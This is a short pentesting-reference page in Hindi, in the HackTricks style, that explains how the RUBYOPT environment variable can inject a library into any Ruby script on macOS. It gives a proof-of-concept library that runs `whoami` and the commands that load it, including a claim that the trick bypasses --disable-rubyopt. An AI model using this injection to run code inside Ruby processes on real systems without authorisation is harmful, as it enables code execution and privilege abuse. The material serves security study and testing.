# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

इस env वेरिएबल का उपयोग करके **ruby** को निष्पादित करते समय **नए params** **जोड़ना** संभव है। हालांकि **`-e`** पैरामीटर का उपयोग ruby को निष्पादित करने के लिए कोड निर्दिष्ट करने के लिए नहीं किया जा सकता, लेकिन **`-I`** और **`-r`** पैरामीटर का उपयोग करके लोड पथ में एक नई फ़ोल्डर जोड़ना और फिर **लोड करने के लिए एक लाइब्रेरी निर्दिष्ट करना** संभव है।

लाइब्रेरी **`inject.rb`** को **`/tmp`** में बनाएं:
```ruby:inject.rb
puts `whoami`
```
किसी भी जगह एक रूबी स्क्रिप्ट बनाएं जैसे:
```ruby:hello.rb
puts 'Hello, World!'
```
फिर एक मनमाना रूबी स्क्रिप्ट इसे लोड करें:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
दिलचस्प तथ्य, यह **`--disable-rubyopt`** पैरामीटर के साथ भी काम करता है:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
